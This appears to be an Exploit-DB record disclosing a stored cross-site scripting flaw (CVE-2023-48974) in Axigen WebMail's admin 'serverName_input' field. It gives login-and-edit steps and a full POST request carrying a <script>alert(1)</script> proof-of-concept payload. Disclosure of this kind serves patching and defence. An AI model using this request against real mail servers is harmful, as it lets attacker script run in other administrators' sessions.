{"source": "https://www.exploit-db.com/exploits/51963", "vulnName": "Axigen < 10.5.7 - Persistent Cross-Site Scripting", "vulnEDBID": "51963", "vulnCVE": "2023-48974", "author": "VINCENT MCRAE, MESUT CETIN", "exploitType": "WEBAPPS", "platform": "PHP", "datePublished": "2024-04-02", "vulnContent": "# Exploit Title: Axigen < 10.5.7 - Persistent Cross-Site Scripting\n# Date: 2023-09-25\n# Exploit Author: Vinnie McRae - RedTeamer IT Security\n# Vendor Homepage: https://www.axigen.com/\n# Software Link: https://www.axigen.com/mail-server/download/\n# Version: (10.5.7) and older version of Axigen WebMail\n# Tested on: firefox, chrome\n# CVE: CVE-2023-48974\n\nDescription\n\nThe `serverName_input` parameter is vulnerable to stored cross-site\nscripting (XSS) due to unsanitized or unfiltered processing. This means\nthat an attacker can inject malicious code into this parameter, which will\nthen be executed by other users when they view the page where the parameter\nis used. This is affecting authenticated administrators, and the attack can\nbe used to attack other administrators with more permissions.\n\nExploitation\n\n1. Login as administrator\n2. Navigate to \"global settings\"\n3. Change server name to <script>alert(1)</script>\n\nPoC of the POST request:\n\n```\nPOST /?_h=1bb40e85937506a7186a125bd8c5d7ef&page=gl_set HTTP/1.1\nHost: localhost:9443\nCookie: eula=true;\nWMSessionObject=%7B%22accountFilter%22%3A%22%22%2C%22currentDomainName%22%3A%22axigen%22%2C%22currentPrincipal%22%3A%22nada%22%2C%22domainFilter%22%3A%22%22%2C%22folderRecipientFilter%22%3A%22%22%2C%22groupFilter%22%3A%22%22%2C%22helpContainer%22%3A%22opened%22%2C%22leftMenu%22%3A%5B%22rights%22%2C%22services%22%2C%22clustering%22%2C%22domains%22%2C%22logging%22%2C%22backup%22%2C%22security%22%5D%2C%22mlistFilter%22%3A%22%22%2C%22premiumFilter%22%3A%22%22%2C%22sslCertificateFilter%22%3A%22%22%7D;\nwebadminIsModified=false; webadminIsUpdated=true; webadminIsSaved=true;\npublic_language=en; _hadmin=6a8ed241fe53d1b28f090146e4c65f52;\nmenuLeftTopPosition=-754\nContent-Type: multipart/form-data;\nboundary=---------------------------41639384187581032291088896642\nContent-Length: 12401\nConnection: close\n\n-----------------------------41639384187581032291088896642\nContent-Disposition: form-data; name=\"serverName_input\"\n\n<script>alert(1)</script>\n-----------------------------41639384187581032291088896642\nContent-Disposition: form-data; name=\"primary_domain_input\"\n\naxigen\n-----------------------------41639384187581032291088896642\nContent-Disposition: form-data; name=\"ssl_random_file_input\"\n\n--SNIP--\n\n-----------------------------41639384187581032291088896642\nContent-Disposition: form-data; name=\"update\"\n\nSave Configuration\n-----------------------------41639384187581032291088896642--\n```\n\n\n\n#______________________________\n#Vinnie McRae\n#RedTeamer IT Security\n#Blog: redteamer.de/blog-beitrag/\n            "}